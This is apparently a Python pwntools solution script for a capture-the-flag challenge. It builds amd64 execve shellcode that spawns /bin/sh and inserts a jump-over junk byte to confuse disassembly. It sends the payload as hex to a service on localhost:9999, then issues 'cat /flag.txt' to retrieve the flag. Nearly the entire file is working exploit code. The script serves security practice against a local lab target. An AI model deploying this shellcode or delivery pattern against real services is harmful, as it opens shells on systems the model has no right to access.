from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'  # Enable debug output

shell = """
xor rax, rax
push rax
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp

xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
"""

shellcode = asm(shell)[:3] + b'\xeb\x01\xe8' + asm(shell)[3:]

# Connect to localhost Docker container
log.info("Connecting to localhost:9999...")
p = remote("localhost", 9999)

log.info("Waiting for prompt...")
p.recvuntil(b'without 0x prefix):\n', timeout=5)

log.info(f"Sending shellcode: {shellcode.hex()}")
p.sendline(shellcode.hex().encode())

log.info("Waiting for execution confirmation...")
p.recvuntil(b'Executing shellcode...', timeout=5)

log.info("Sending command to read flag...")
p.sendline(b'cat /flag.txt')

log.info("Receiving flag...")
flag = p.recvuntil(b"}", timeout=10)
log.success(f"Flag: {flag.decode()}")

p.close()
